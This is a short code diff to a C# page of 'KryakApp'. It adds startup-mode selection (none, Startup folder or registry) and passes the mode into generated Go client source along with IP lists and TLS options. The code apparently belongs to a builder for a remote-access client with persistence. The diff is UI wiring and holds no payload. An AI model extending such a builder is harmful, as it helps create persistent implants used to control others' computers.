@@ -165,6 +165,22 @@ namespace KryakApp.Pages
             DropDirectoryTextBox.IsEnabled = false;
         }
 
+        private void StartupModeRadio_Checked(object sender, RoutedEventArgs e)
+        {
+            if (NoStartupRadio == null || RegistryStartupRadio == null || DropCheckBox == null)
+            {
+                return;
+            }
+
+            bool dropAllowed = NoStartupRadio.IsChecked == true || RegistryStartupRadio.IsChecked == true;
+            DropCheckBox.IsEnabled = dropAllowed;
+
+            if (!dropAllowed && DropCheckBox.IsChecked == true)
+            {
+                DropCheckBox.IsChecked = false;
+            }
+        }
+
         private void PinnedModeRadio_Checked(object sender, RoutedEventArgs e)
         {
             PinnedOptionsPanel.Visibility = Visibility.Visible;
@@ -321,8 +337,10 @@ namespace KryakApp.Pages
                 ? "insecure"
                 : PinnedModeRadio.IsChecked == true ? "pinned" : "strict";
             string pinnedFingerprint = FingerprintTextBox.Text;
-
-            if (App.MainWindow is null)
+            int startupMode =
+            NoStartupRadio.IsChecked == true ? 0 :
+            FolderStartupRadio.IsChecked == true ? 1 : 2;
+                if (App.MainWindow is null)
             {
                 await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
                 return;
@@ -357,7 +375,7 @@ namespace KryakApp.Pages
             string tempModPath = Path.Combine(tempBuildDir, "go.mod");
             string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
             File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
-            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint));
+            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode));
             File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
             File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());
 
